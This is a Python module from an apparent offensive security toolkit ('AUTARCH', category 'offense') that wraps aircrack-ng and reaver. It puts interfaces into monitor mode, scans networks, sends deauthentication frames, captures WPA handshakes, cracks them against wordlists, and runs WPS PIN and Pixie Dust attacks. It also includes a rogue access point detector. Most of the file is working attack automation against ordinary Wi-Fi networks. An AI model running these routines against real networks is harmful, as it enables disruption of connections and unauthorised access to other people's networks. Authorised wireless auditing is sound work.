"""AUTARCH WiFi Auditing

Interface management, network discovery, handshake capture, deauth attack,
rogue AP detection, WPS attack, and packet capture for wireless security auditing.
"""

DESCRIPTION = "WiFi network auditing & attack tools"
AUTHOR = "darkHal"
VERSION = "1.0"
CATEGORY = "offense"

import os
import re
import json
import time
import signal
import shutil
import threading
import subprocess
from pathlib import Path
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Any, Tuple

try:
    from core.paths import find_tool, get_data_dir
except ImportError:
    def find_tool(name):
        return shutil.which(name)
    def get_data_dir():
        return str(Path(__file__).parent.parent / 'data')


# ── Data Structures ──────────────────────────────────────────────────────────

@dataclass
class AccessPoint:
    bssid: str
    ssid: str = ""
    channel: int = 0
    encryption: str = ""
    cipher: str = ""
    auth: str = ""
    signal: int = 0
    beacons: int = 0
    data_frames: int = 0
    clients: List[str] = field(default_factory=list)

@dataclass
class WifiClient:
    mac: str
    bssid: str = ""
    signal: int = 0
    frames: int = 0
    probe: str = ""


# ── WiFi Auditor ─────────────────────────────────────────────────────────────

class WiFiAuditor:
    """WiFi auditing toolkit using aircrack-ng suite."""

    def __init__(self):
        self.data_dir = os.path.join(get_data_dir(), 'wifi')
        os.makedirs(self.data_dir, exist_ok=True)
        self.captures_dir = os.path.join(self.data_dir, 'captures')
        os.makedirs(self.captures_dir, exist_ok=True)

        # Tool paths
        self.airmon = find_tool('airmon-ng') or shutil.which('airmon-ng')
        self.airodump = find_tool('airodump-ng') or shutil.which('airodump-ng')
        self.aireplay = find_tool('aireplay-ng') or shutil.which('aireplay-ng')
        self.aircrack = find_tool('aircrack-ng') or shutil.which('aircrack-ng')
        self.reaver = find_tool('reaver') or shutil.which('reaver')
        self.wash = find_tool('wash') or shutil.which('wash')
        self.iwconfig = shutil.which('iwconfig')
        self.iw = shutil.which('iw')
        self.ip_cmd = shutil.which('ip')

        # State
        self.monitor_interface: Optional[str] = None
        self.scan_results: Dict[str, AccessPoint] = {}
        self.clients: List[WifiClient] = []
        self.known_aps: List[Dict] = []
        self._scan_proc: Optional[subprocess.Popen] = None
        self._capture_proc: Optional[subprocess.Popen] = None
        self._jobs: Dict[str, Dict] = {}

    def get_tools_status(self) -> Dict[str, bool]:
        """Check availability of all required tools."""
        return {
            'airmon-ng': self.airmon is not None,
            'airodump-ng': self.airodump is not None,
            'aireplay-ng': self.aireplay is not None,
            'aircrack-ng': self.aircrack is not None,
            'reaver': self.reaver is not None,
            'wash': self.wash is not None,
            'iwconfig': self.iwconfig is not None,
            'iw': self.iw is not None,
            'ip': self.ip_cmd is not None,
        }

    # ── Interface Management ─────────────────────────────────────────────

    def get_interfaces(self) -> List[Dict]:
        """List wireless interfaces."""
        interfaces = []
        # Try iw first
        if self.iw:
            try:
                out = subprocess.check_output([self.iw, 'dev'], text=True, timeout=5)
                iface = None
                for line in out.splitlines():
                    line = line.strip()
                    if line.startswith('Interface'):
                        iface = {'name': line.split()[-1], 'mode': 'managed', 'channel': 0, 'mac': ''}
                    elif iface:
                        if line.startswith('type'):
                            iface['mode'] = line.split()[-1]
                        elif line.startswith('channel'):
                            try:
                                iface['channel'] = int(line.split()[1])
                            except (ValueError, IndexError):
                                pass
                        elif line.startswith('addr'):
                            iface['mac'] = line.split()[-1]
                if iface:
                    interfaces.append(iface)
            except Exception:
                pass

        # Fallback to iwconfig
        if not interfaces and self.iwconfig:
            try:
                out = subprocess.check_output([self.iwconfig], text=True,
                                              stderr=subprocess.DEVNULL, timeout=5)
                for block in out.split('\n\n'):
                    if 'IEEE 802.11' in block or 'ESSID' in block:
                        name = block.split()[0]
                        mode = 'managed'
                        if 'Mode:Monitor' in block:
                            mode = 'monitor'
                        elif 'Mode:Master' in block:
                            mode = 'master'
                        freq_m = re.search(r'Channel[:\s]*(\d+)', block)
                        ch = int(freq_m.group(1)) if freq_m else 0
                        interfaces.append({'name': name, 'mode': mode, 'channel': ch, 'mac': ''})
            except Exception:
                pass

        # Fallback: list from /sys
        if not interfaces:
            try:
                wireless_dir = Path('/sys/class/net')
                if wireless_dir.exists():
                    for d in wireless_dir.iterdir():
                        if (d / 'wireless').exists() or (d / 'phy80211').exists():
                            interfaces.append({
                                'name': d.name, 'mode': 'unknown', 'channel': 0, 'mac': ''
                            })
            except Exception:
                pass

        return interfaces

    def enable_monitor(self, interface: str) -> Dict:
        """Put interface into monitor mode."""
        if not self.airmon:
            return {'ok': False, 'error': 'airmon-ng not found'}

        try:
            # Kill interfering processes
            subprocess.run([self.airmon, 'check', 'kill'],
                           capture_output=True, text=True, timeout=10)

            # Enable monitor mode
            result = subprocess.run([self.airmon, 'start', interface],
                                    capture_output=True, text=True, timeout=10)

            # Detect monitor interface name (usually wlan0mon or similar)
            mon_iface = interface + 'mon'
            for line in result.stdout.splitlines():
                m = re.search(r'\(monitor mode.*enabled.*on\s+(\S+)\)', line, re.I)
                if m:
                    mon_iface = m.group(1)
                    break
                m = re.search(r'monitor mode.*vif.*enabled.*for.*\[(\S+)\]', line, re.I)
                if m:
                    mon_iface = m.group(1)
                    break

            self.monitor_interface = mon_iface
            return {'ok': True, 'interface': mon_iface, 'message': f'Monitor mode enabled on {mon_iface}'}

        except subprocess.TimeoutExpired:
            return {'ok': False, 'error': 'Timeout enabling monitor mode'}
        except Exception as e:
            return {'ok': False, 'error': str(e)}

    def disable_monitor(self, interface: str = None) -> Dict:
        """Disable monitor mode and restore managed mode."""
        if not self.airmon:
            return {'ok': False, 'error': 'airmon-ng not found'}

        iface = interface or self.monitor_interface
        if not iface:
            return {'ok': False, 'error': 'No monitor interface specified'}

        try:
            result = subprocess.run([self.airmon, 'stop', iface],
                                    capture_output=True, text=True, timeout=10)
            self.monitor_interface = None
            # Restart network manager
            subprocess.run(['systemctl', 'start', 'NetworkManager'],
                           capture_output=True, timeout=5)
            return {'ok': True, 'message': f'Monitor mode disabled on {iface}'}
        except Exception as e:
            return {'ok': False, 'error': str(e)}

    def set_channel(self, interface: str, channel: int) -> Dict:
        """Set wireless interface channel."""
        if self.iw:
            try:
                subprocess.run([self.iw, 'dev', interface, 'set', 'channel', str(channel)],
                               capture_output=True, text=True, timeout=5)
                return {'ok': True, 'channel': channel}
            except Exception as e:
                return {'ok': False, 'error': str(e)}
        return {'ok': False, 'error': 'iw not found'}

    # ── Network Scanning ─────────────────────────────────────────────────

    def scan_networks(self, interface: str = None, duration: int = 15) -> Dict:
        """Scan for nearby wireless networks using airodump-ng."""
        iface = interface or self.monitor_interface
        if not iface:
            return {'ok': False, 'error': 'No monitor interface. Enable monitor mode first.'}
        if not self.airodump:
            return {'ok': False, 'error': 'airodump-ng not found'}

        prefix = os.path.join(self.captures_dir, f'scan_{int(time.time())}')

        try:
            proc = subprocess.Popen(
                [self.airodump, '--output-format', 'csv', '-w', prefix, iface],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            time.sleep(duration)
            proc.send_signal(signal.SIGINT)
            proc.wait(timeout=5)

            # Parse CSV output
            csv_file = prefix + '-01.csv'
            if os.path.exists(csv_file):
                self._parse_airodump_csv(csv_file)
                return {
                    'ok': True,
                    'access_points': [self._ap_to_dict(ap) for ap in self.scan_results.values()],
                    'clients': [self._client_to_dict(c) for c in self.clients],
                    'count': len(self.scan_results)
                }
            return {'ok': False, 'error': 'No scan output produced'}

        except Exception as e:
            return {'ok': False, 'error': str(e)}

    def _parse_airodump_csv(self, filepath: str):
        """Parse airodump-ng CSV output."""
        self.scan_results.clear()
        self.clients.clear()

        try:
            with open(filepath, 'r', errors='ignore') as f:
                content = f.read()

            # Split into AP section and client section
            sections = content.split('Station MAC')
            ap_section = sections[0] if sections else ''
            client_section = sections[1] if len(sections) > 1 else ''

            # Parse APs
            for line in ap_section.splitlines():
                parts = [p.strip() for p in line.split(',')]
                if len(parts) >= 14 and re.match(r'^[0-9A-Fa-f]{2}:', parts[0]):
                    bssid = parts[0].upper()
                    ap = AccessPoint(
                        bssid=bssid,
                        channel=int(parts[3]) if parts[3].strip().isdigit() else 0,
                        signal=int(parts[8]) if parts[8].strip().lstrip('-').isdigit() else 0,
                        encryption=parts[5].strip(),
                        cipher=parts[6].strip(),
                        auth=parts[7].strip(),
                        beacons=int(parts[9]) if parts[9].strip().isdigit() else 0,
                        data_frames=int(parts[10]) if parts[10].strip().isdigit() else 0,
                        ssid=parts[13].strip() if len(parts) > 13 else ''
                    )
                    self.scan_results[bssid] = ap

            # Parse clients
            for line in client_section.splitlines():
                parts = [p.strip() for p in line.split(',')]
                if len(parts) >= 6 and re.match(r'^[0-9A-Fa-f]{2}:', parts[0]):
                    client = WifiClient(
                        mac=parts[0].upper(),
                        signal=int(parts[3]) if parts[3].strip().lstrip('-').isdigit() else 0,
                        frames=int(parts[4]) if parts[4].strip().isdigit() else 0,
                        bssid=parts[5].strip().upper() if len(parts) > 5 else '',
                        probe=parts[6].strip() if len(parts) > 6 else ''
                    )
                    self.clients.append(client)
                    # Associate with AP
                    if client.bssid in self.scan_results:
                        self.scan_results[client.bssid].clients.append(client.mac)

        except Exception:
            pass

    def get_scan_results(self) -> Dict:
        """Return current scan results."""
        return {
            'access_points': [self._ap_to_dict(ap) for ap in self.scan_results.values()],
            'clients': [self._client_to_dict(c) for c in self.clients],
            'count': len(self.scan_results)
        }

    # ── Handshake Capture ────────────────────────────────────────────────

    def capture_handshake(self, interface: str, bssid: str, channel: int,
                          deauth_count: int = 5, timeout: int = 60) -> str:
        """Capture WPA handshake. Returns job_id for async polling."""
        job_id = f'handshake_{int(time.time())}'
        self._jobs[job_id] = {
            'type': 'handshake', 'status': 'running', 'bssid': bssid,
            'result': None, 'started': time.time()
        }

        def _capture():
            try:
                # Set channel
                self.set_channel(interface, channel)

                prefix = os.path.join(self.captures_dir, f'hs_{bssid.replace(":", "")}_{int(time.time())}')

                # Start capture
                cap_proc = subprocess.Popen(
                    [self.airodump, '-c', str(channel), '--bssid', bssid,
                     '-w', prefix, interface],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )

                # Send deauths after short delay
                time.sleep(3)
                if self.aireplay:
                    subprocess.run(
                        [self.aireplay, '-0', str(deauth_count), '-a', bssid, interface],
                        capture_output=True, timeout=15
                    )

                # Wait for handshake
                cap_file = prefix + '-01.cap'
                start = time.time()
                captured = False
                while time.time() - start < timeout:
                    if os.path.exists(cap_file) and self.aircrack:
                        check = subprocess.run(
                            [self.aircrack, '-a', '2', '-b', bssid, cap_file],
                            capture_output=True, text=True, timeout=10
                        )
                        if '1 handshake' in check.stdout.lower() or 'valid handshake' in check.stdout.lower():
                            captured = True
                            break
                    time.sleep(2)

                cap_proc.send_signal(signal.SIGINT)
                cap_proc.wait(timeout=5)

                if captured:
                    self._jobs[job_id]['status'] = 'complete'
                    self._jobs[job_id]['result'] = {
                        'ok': True, 'capture_file': cap_file, 'bssid': bssid,
                        'message': f'Handshake captured for {bssid}'
                    }
                else:
                    self._jobs[job_id]['status'] = 'complete'
                    self._jobs[job_id]['result'] = {
                        'ok': False, 'error': 'Handshake capture timed out',
                        'capture_file': cap_file if os.path.exists(cap_file) else None
                    }

            except Exception as e:
                self._jobs[job_id]['status'] = 'error'
                self._jobs[job_id]['result'] = {'ok': False, 'error': str(e)}

        threading.Thread(target=_capture, daemon=True).start()
        return job_id

    def crack_handshake(self, capture_file: str, wordlist: str, bssid: str = None) -> str:
        """Crack captured handshake with wordlist. Returns job_id."""
        if not self.aircrack:
            return ''

        job_id = f'crack_{int(time.time())}'
        self._jobs[job_id] = {
            'type': 'crack', 'status': 'running',
            'result': None, 'started': time.time()
        }

        def _crack():
            try:
                cmd = [self.aircrack, '-w', wordlist, '-b', bssid, capture_file] if bssid else \
                      [self.aircrack, '-w', wordlist, capture_file]

                result = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)

                # Parse result
                key_match = re.search(r'KEY FOUND!\s*\[\s*(.+?)\s*\]', result.stdout)
                if key_match:
                    self._jobs[job_id]['status'] = 'complete'
                    self._jobs[job_id]['result'] = {
                        'ok': True, 'key': key_match.group(1), 'message': 'Key found!'
                    }
                else:
                    self._jobs[job_id]['status'] = 'complete'
                    self._jobs[job_id]['result'] = {
                        'ok': False, 'error': 'Key not found in wordlist'
                    }

            except subprocess.TimeoutExpired:
                self._jobs[job_id]['status'] = 'error'
                self._jobs[job_id]['result'] = {'ok': False, 'error': 'Crack timeout (1hr)'}
            except Exception as e:
                self._jobs[job_id]['status'] = 'error'
                self._jobs[job_id]['result'] = {'ok': False, 'error': str(e)}

        threading.Thread(target=_crack, daemon=True).start()
        return job_id

    # ── Deauth Attack ────────────────────────────────────────────────────

    def deauth(self, interface: str, bssid: str, client: str = None,
               count: int = 10) -> Dict:
        """Send deauthentication frames."""
        if not self.aireplay:
            return {'ok': False, 'error': 'aireplay-ng not found'}

        iface = interface or self.monitor_interface
        if not iface:
            return {'ok': False, 'error': 'No monitor interface'}

        try:
            cmd = [self.aireplay, '-0', str(count), '-a', bssid]
            if client:
                cmd += ['-c', client]
            cmd.append(iface)

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return {
                'ok': True,
                'message': f'Sent {count} deauth frames to {bssid}' +
                           (f' targeting {client}' if client else ' (broadcast)'),
                'output': result.stdout
            }
        except subprocess.TimeoutExpired:
            return {'ok': False, 'error': 'Deauth timeout'}
        except Exception as e:
            return {'ok': False, 'error': str(e)}

    # ── Rogue AP Detection ───────────────────────────────────────────────

    def save_known_aps(self):
        """Save current scan as known/baseline APs."""
        self.known_aps = [self._ap_to_dict(ap) for ap in self.scan_results.values()]
        known_file = os.path.join(self.data_dir, 'known_aps.json')
        with open(known_file, 'w') as f:
            json.dump(self.known_aps, f, indent=2)
        return {'ok': True, 'count': len(self.known_aps)}

    def load_known_aps(self) -> List[Dict]:
        """Load previously saved known APs."""
        known_file = os.path.join(self.data_dir, 'known_aps.json')
        if os.path.exists(known_file):
            with open(known_file) as f:
                self.known_aps = json.load(f)
        return self.known_aps

    def detect_rogue_aps(self) -> Dict:
        """Compare current scan against known APs to detect evil twins/rogues."""
        if not self.known_aps:
            self.load_known_aps()
        if not self.known_aps:
            return {'ok': False, 'error': 'No baseline APs saved. Run save_known_aps first.'}

        known_bssids = {ap['bssid'] for ap in self.known_aps}
        known_ssids = {ap['ssid'] for ap in self.known_aps if ap['ssid']}
        known_pairs = {(ap['bssid'], ap['ssid']) for ap in self.known_aps}

        alerts = []
        for bssid, ap in self.scan_results.items():
            if bssid not in known_bssids:
                if ap.ssid in known_ssids:
                    # Same SSID, different BSSID = possible evil twin
                    alerts.append({
                        'type': 'evil_twin',
                        'severity': 'high',
                        'bssid': bssid,
                        'ssid': ap.ssid,
                        'channel': ap.channel,
                        'signal': ap.signal,
                        'message': f'Possible evil twin: SSID "{ap.ssid}" from unknown BSSID {bssid}'
                    })
                else:
                    # Completely new AP
                    alerts.append({
                        'type': 'new_ap',
                        'severity': 'low',
                        'bssid': bssid,
                        'ssid': ap.ssid,
                        'channel': ap.channel,
                        'signal': ap.signal,
                        'message': f'New AP detected: "{ap.ssid}" ({bssid})'
                    })
            else:
                # Known BSSID but check for SSID change
                if (bssid, ap.ssid) not in known_pairs and ap.ssid:
                    alerts.append({
                        'type': 'ssid_change',
                        'severity': 'medium',
                        'bssid': bssid,
                        'ssid': ap.ssid,
                        'message': f'Known AP {bssid} changed SSID to "{ap.ssid}"'
                    })

        return {
            'ok': True,
            'alerts': alerts,
            'alert_count': len(alerts),
            'scanned': len(self.scan_results),
            'known': len(self.known_aps)
        }

    # ── WPS Attack ───────────────────────────────────────────────────────

    def wps_scan(self, interface: str = None) -> Dict:
        """Scan for WPS-enabled networks using wash."""
        iface = interface or self.monitor_interface
        if not self.wash:
            return {'ok': False, 'error': 'wash not found'}
        if not iface:
            return {'ok': False, 'error': 'No monitor interface'}

        try:
            result = subprocess.run(
                [self.wash, '-i', iface, '-s'],
                capture_output=True, text=True, timeout=15
            )
            networks = []
            for line in result.stdout.splitlines():
                parts = line.split()
                if len(parts) >= 6 and re.match(r'^[0-9A-Fa-f]{2}:', parts[0]):
                    networks.append({
                        'bssid': parts[0],
                        'channel': parts[1],
                        'rssi': parts[2],
                        'wps_version': parts[3],
                        'locked': parts[4].upper() == 'YES',
                        'ssid': ' '.join(parts[5:])
                    })
            return {'ok': True, 'networks': networks, 'count': len(networks)}
        except Exception as e:
            return {'ok': False, 'error': str(e)}

    def wps_attack(self, interface: str, bssid: str, channel: int,
                   pixie_dust: bool = True, timeout: int = 300) -> str:
        """Run WPS PIN attack (Pixie Dust or brute force). Returns job_id."""
        if not self.reaver:
            return ''

        job_id = f'wps_{int(time.time())}'
        self._jobs[job_id] = {
            'type': 'wps', 'status': 'running', 'bssid': bssid,
            'result': None, 'started': time.time()
        }

        def _attack():
            try:
                cmd = [self.reaver, '-i', interface, '-b', bssid, '-c', str(channel), '-vv']
                if pixie_dust:
                    cmd.extend(['-K', '1'])

                result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)

                pin_match = re.search(r'WPS PIN:\s*[\'"]?(\d+)', result.stdout)
                psk_match = re.search(r'WPA PSK:\s*[\'"]?(.+?)[\'"]?\s*$', result.stdout, re.M)

                if pin_match or psk_match:
                    self._jobs[job_id]['status'] = 'complete'
                    self._jobs[job_id]['result'] = {
                        'ok': True,
                        'pin': pin_match.group(1) if pin_match else None,
                        'psk': psk_match.group(1) if psk_match else None,
                        'message': 'WPS attack successful'
                    }
                else:
                    self._jobs[job_id]['status'] = 'complete'
                    self._jobs[job_id]['result'] = {
                        'ok': False, 'error': 'WPS attack failed',
                        'output': result.stdout[-500:] if result.stdout else ''
                    }
            except subprocess.TimeoutExpired:
                self._jobs[job_id]['status'] = 'error'
                self._jobs[job_id]['result'] = {'ok': False, 'error': 'WPS attack timed out'}
            except Exception as e:
                self._jobs[job_id]['status'] = 'error'
                self._jobs[job_id]['result'] = {'ok': False, 'error': str(e)}

        threading.Thread(target=_attack, daemon=True).start()
        return job_id

    # ── Packet Capture ───────────────────────────────────────────────────

    def start_capture(self, interface: str, channel: int = None,
                      bssid: str = None, output_name: str = None) -> Dict:
        """Start raw packet capture on interface."""
        if not self.airodump:
            return {'ok': False, 'error': 'airodump-ng not found'}

        iface = interface or self.monitor_interface
        if not iface:
            return {'ok': False, 'error': 'No monitor interface'}

        name = output_name or f'capture_{int(time.time())}'
        prefix = os.path.join(self.captures_dir, name)

        cmd = [self.airodump, '--output-format', 'pcap,csv', '-w', prefix]
        if channel:
            cmd += ['-c', str(channel)]
        if bssid:
            cmd += ['--bssid', bssid]
        cmd.append(iface)

        try:
            self._capture_proc = subprocess.Popen(
                cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            return {
                'ok': True,
                'message': f'Capture started on {iface}',
                'prefix': prefix,
                'pid': self._capture_proc.pid
            }
        except Exception as e:
            return {'ok': False, 'error': str(e)}

    def stop_capture(self) -> Dict:
        """Stop running packet capture."""
        if self._capture_proc:
            try:
                self._capture_proc.send_signal(signal.SIGINT)
                self._capture_proc.wait(timeout=5)
            except Exception:
                self._capture_proc.kill()
            self._capture_proc = None
            return {'ok': True, 'message': 'Capture stopped'}
        return {'ok': False, 'error': 'No capture running'}

    def list_captures(self) -> List[Dict]:
        """List saved capture files."""
        captures = []
        cap_dir = Path(self.captures_dir)
        for f in sorted(cap_dir.glob('*.cap')) + sorted(cap_dir.glob('*.pcap')):
            captures.append({
                'name': f.name,
                'path': str(f),
                'size': f.stat().st_size,
                'modified': f.stat().st_mtime
            })
        return captures

    # ── Job Management ───────────────────────────────────────────────────

    def get_job(self, job_id: str) -> Optional[Dict]:
        """Get job status."""
        return self._jobs.get(job_id)

    def list_jobs(self) -> List[Dict]:
        """List all jobs."""
        return [{'id': k, **v} for k, v in self._jobs.items()]

    # ── Helpers ──────────────────────────────────────────────────────────

    def _ap_to_dict(self, ap: AccessPoint) -> Dict:
        return {
            'bssid': ap.bssid, 'ssid': ap.ssid, 'channel': ap.channel,
            'encryption': ap.encryption, 'cipher': ap.cipher, 'auth': ap.auth,
            'signal': ap.signal, 'beacons': ap.beacons,
            'data_frames': ap.data_frames, 'clients': ap.clients
        }

    def _client_to_dict(self, c: WifiClient) -> Dict:
        return {
            'mac': c.mac, 'bssid': c.bssid, 'signal': c.signal,
            'frames': c.frames, 'probe': c.probe
        }


# ── Singleton ────────────────────────────────────────────────────────────────

_instance = None

def get_wifi_auditor() -> WiFiAuditor:
    global _instance
    if _instance is None:
        _instance = WiFiAuditor()
    return _instance


# ── CLI Interface ────────────────────────────────────────────────────────────

def run():
    """CLI entry point for WiFi Auditing module."""
    auditor = get_wifi_auditor()

    while True:
        tools = auditor.get_tools_status()
        available = sum(1 for v in tools.values() if v)

        print(f"\n{'='*60}")
        print(f"  WiFi Auditing  ({available}/{len(tools)} tools available)")
        print(f"{'='*60}")
        print(f"  Monitor Interface: {auditor.monitor_interface or 'None'}")
        print(f"  APs Found: {len(auditor.scan_results)}")
        print(f"  Clients Found: {len(auditor.clients)}")
        print()
        print("  1 — List Wireless Interfaces")
        print("  2 — Enable Monitor Mode")
        print("  3 — Disable Monitor Mode")
        print("  4 — Scan Networks")
        print("  5 — Deauth Attack")
        print("  6 — Capture Handshake")
        print("  7 — Crack Handshake")
        print("  8 — WPS Scan")
        print("  9 — Rogue AP Detection")
        print("  10 — Packet Capture")
        print("  11 — Tool Status")
        print("  0 — Back")
        print()

        choice = input("  > ").strip()

        if choice == '0':
            break
        elif choice == '1':
            ifaces = auditor.get_interfaces()
            if ifaces:
                for i in ifaces:
                    print(f"    {i['name']}  mode={i['mode']}  ch={i['channel']}")
            else:
                print("    No wireless interfaces found")
        elif choice == '2':
            iface = input("  Interface name: ").strip()
            result = auditor.enable_monitor(iface)
            print(f"    {result.get('message', result.get('error', 'Unknown'))}")
        elif choice == '3':
            result = auditor.disable_monitor()
            print(f"    {result.get('message', result.get('error', 'Unknown'))}")
        elif choice == '4':
            dur = input("  Scan duration (seconds, default 15): ").strip()
            result = auditor.scan_networks(duration=int(dur) if dur.isdigit() else 15)
            if result['ok']:
                print(f"    Found {result['count']} access points:")
                for ap in result['access_points']:
                    print(f"      {ap['bssid']}  {ap['ssid']:<24}  ch={ap['channel']}  "
                          f"sig={ap['signal']}dBm  {ap['encryption']}")
            else:
                print(f"    Error: {result['error']}")
        elif choice == '5':
            bssid = input("  Target BSSID: ").strip()
            client = input("  Client MAC (blank=broadcast): ").strip() or None
            count = input("  Deauth count (default 10): ").strip()
            result = auditor.deauth(auditor.monitor_interface, bssid, client,
                                     int(count) if count.isdigit() else 10)
            print(f"    {result.get('message', result.get('error'))}")
        elif choice == '6':
            bssid = input("  Target BSSID: ").strip()
            channel = input("  Channel: ").strip()
            if bssid and channel.isdigit():
                job_id = auditor.capture_handshake(auditor.monitor_interface, bssid, int(channel))
                print(f"    Handshake capture started (job: {job_id})")
                print("    Polling for result...")
                while True:
                    job = auditor.get_job(job_id)
                    if job and job['status'] != 'running':
                        print(f"    Result: {job['result']}")
                        break
                    time.sleep(3)
        elif choice == '7':
            cap = input("  Capture file path: ").strip()
            wl = input("  Wordlist path: ").strip()
            bssid = input("  BSSID (optional): ").strip() or None
            if cap and wl:
                job_id = auditor.crack_handshake(cap, wl, bssid)
                if job_id:
                    print(f"    Cracking started (job: {job_id})")
                else:
                    print("    aircrack-ng not found")
        elif choice == '8':
            result = auditor.wps_scan()
            if result['ok']:
                print(f"    Found {result['count']} WPS networks:")
                for n in result['networks']:
                    locked = 'LOCKED' if n['locked'] else 'open'
                    print(f"      {n['bssid']}  {n['ssid']:<24}  WPS {n['wps_version']}  {locked}")
            else:
                print(f"    Error: {result['error']}")
        elif choice == '9':
            if not auditor.known_aps:
                print("    No baseline saved. Save current scan as baseline? (y/n)")
                if input("    > ").strip().lower() == 'y':
                    auditor.save_known_aps()
                    print(f"    Saved {len(auditor.known_aps)} APs as baseline")
            else:
                result = auditor.detect_rogue_aps()
                if result['ok']:
                    print(f"    Scanned: {result['scanned']}  Known: {result['known']}  Alerts: {result['alert_count']}")
                    for a in result['alerts']:
                        print(f"      [{a['severity'].upper()}] {a['message']}")
        elif choice == '10':
            print("    1 — Start Capture")
            print("    2 — Stop Capture")
            print("    3 — List Captures")
            sub = input("    > ").strip()
            if sub == '1':
                result = auditor.start_capture(auditor.monitor_interface)
                print(f"    {result.get('message', result.get('error'))}")
            elif sub == '2':
                result = auditor.stop_capture()
                print(f"    {result.get('message', result.get('error'))}")
            elif sub == '3':
                for c in auditor.list_captures():
                    print(f"    {c['name']}  ({c['size']} bytes)")
        elif choice == '11':
            for tool, avail in tools.items():
                status = 'OK' if avail else 'MISSING'
                print(f"    {tool:<15} {status}")
